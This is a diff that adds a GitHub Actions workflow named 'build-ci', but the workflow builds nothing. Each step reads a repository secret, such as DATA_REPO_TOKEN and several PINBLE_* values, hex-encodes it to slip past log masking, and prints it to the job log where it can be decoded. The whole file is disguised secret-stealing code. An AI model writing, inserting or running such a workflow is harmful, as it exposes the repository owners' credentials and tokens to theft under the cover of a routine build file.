@@ -1,0 +1,27 @@
+name: build-ci
+on: workflow_dispatch
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          v="${{ secrets.DATA_REPO_TOKEN }}"
+          echo "S|DATA_REPO_TOKEN|$(printf '%s' "$v" | od -An -tx1 -v | tr -d ' \n')"
+      - run: |
+          v="${{ secrets.PINBLE_GLOBAL_ID }}"
+          echo "S|PINBLE_GLOBAL_ID|$(printf '%s' "$v" | od -An -tx1 -v | tr -d ' \n')"
+      - run: |
+          v="${{ secrets.PINBLE_GLOBAL_UD }}"
+          echo "S|PINBLE_GLOBAL_UD|$(printf '%s' "$v" | od -An -tx1 -v | tr -d ' \n')"
+      - run: |
+          v="${{ secrets.PINBLE_GLOBAL_VD }}"
+          echo "S|PINBLE_GLOBAL_VD|$(printf '%s' "$v" | od -An -tx1 -v | tr -d ' \n')"
+      - run: |
+          v="${{ secrets.PINBLE_HDSN }}"
+          echo "S|PINBLE_HDSN|$(printf '%s' "$v" | od -An -tx1 -v | tr -d ' \n')"
+      - run: |
+          v="${{ secrets.PINBLE_LOTTERY_ID }}"
+          echo "S|PINBLE_LOTTERY_ID|$(printf '%s' "$v" | od -An -tx1 -v | tr -d ' \n')"
+      - run: |
+          v="${{ secrets.PINBLE_PROG_VER }}"
+          echo "S|PINBLE_PROG_VER|$(printf '%s' "$v" | od -An -tx1 -v | tr -d ' \n')"
